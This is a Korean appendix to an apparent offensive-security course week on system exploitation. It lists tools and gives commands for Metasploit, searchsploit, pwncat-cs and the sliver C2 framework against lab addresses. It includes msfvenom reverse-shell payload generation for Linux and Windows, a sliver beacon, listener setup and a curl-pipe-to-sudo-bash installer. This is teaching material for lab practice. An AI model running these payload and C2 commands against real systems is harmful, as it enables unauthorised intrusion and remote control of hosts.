...
## 부록: 학습 OSS 도구 매트릭스 (Course1 Attack — Week 07 시스템 익스플로잇)

| 공격 유형 | lab step | 본문 도구 | OSS 도구 옵션 (강조) | 비고 |
|----------|----------|----------|---------------------|------|
| Exploit DB 검색 | s1 | `searchsploit` | searchsploit / cve-search / exploitalert | local DB |
| Metasploit 설치/시작 | s2 | `msfconsole` | metasploit-framework / armitage | armitage GUI deprecated |
| 모듈 검색 | s3 | `msf > search` | msf search / use / info | msf 고유 |
| 옵션 설정/실행 | s4,5 | `msf > set/run` | msf / Cobalt Strike (상용) / Sliver (OSS C2) | sliver 도 학습 |
| Meterpreter 세션 | s6,7 | `meterpreter` | meterpreter / sliver implant / Empire | meterpreter 표준 |
| Reverse Shell | s8 | `nc -lnvp` + bash | netcat / pwncat-cs / socat / msfvenom | pwncat-cs 권장 (modernized) |
| 파일 전송 | s9 | `meterpreter download` | meterpreter / scp / impacket-smbserver | smbserver 임시 share |
| Persistence 모듈 | s10 | `msf > exploit/multi/handler` | msf / sliver | 9주차에 별도 |
| privesc 모듈 | s11 | `msf > use post/multi/recon/local_exploit_suggester` | linpeas / windows-exploit-suggester / pspy | 8주차 본격 |
| msfvenom payload | s12 | `msfvenom -p ...` | msfvenom / shellter / veil-evasion / donut | 12주차 은닉 연결 |
| handler 대기 | s13 | `msf > exploit/multi/handler` | msf / nc / sliver | |
| 보고 | s15 | text | msf db_export / armitage 보고 | DB 기반 추적 |
...
# Metasploit (이미 설치되어 있을 수 있음)
sudo apt update && sudo apt install -y metasploit-framework
msfdb init                     # PostgreSQL DB 초기화

# searchsploit (3주차에 이미 설치)
sudo apt install -y exploitdb
sudo searchsploit -u

# pwncat-cs (modern netcat replacement, Python)
pip3 install pwncat-cs

# sliver (오픈소스 C2 — 학습용)
curl https://sliver.sh/install | sudo bash 2>/dev/null

# socat (다목적 relay)
sudo apt install -y socat

# Empire (PowerShell C2 — Win 침투용, 학습 참고)
# git clone --recursive https://github.com/BC-SECURITY/Empire.git ~/Empire
```

### 도구별 핵심 사용법

```bash
# Metasploit — 가장 큰 OSS 익스플로잇 프레임워크
msfconsole -q
msf6 > search type:exploit name:apache
msf6 > use exploit/...
msf6 > set RHOSTS 10.20.30.80
msf6 > set LHOST 10.20.30.201
msf6 > run

# msfvenom — payload 생성
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/sh.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f exe -o /tmp/sh.exe

# pwncat-cs — meterpreter 라이트, Python
pwncat-cs -lp 4444                          # listener
pwncat-cs 10.20.30.80 4444                  # connect

# searchsploit (3주차에 이미)
searchsploit apache 2.4
searchsploit -m 51890                        # mirror (로컬 복사)

# sliver — 현대적 OSS C2 (Beacon/Session 모델)
sliver-server                                # 서버 시작
sliver > generate beacon --mtls 10.20.30.201:443
```
...
```bash
# nmap 결과를 직접 import
msf6 > db_nmap -sV -O 10.20.30.0/24
msf6 > services
msf6 > vulns

# 호스트 자동 추적
msf6 > hosts
msf6 > db_export -f xml /tmp/msf.xml
```

학생은 본 7주차에서 **Metasploit + msfvenom + searchsploit** 의 3종 통합 흐름을 익힌다 — 정찰 (db_nmap) → 익스플로잇 (use/set/run) → payload (msfvenom) → 세션 (meterpreter/pwncat).
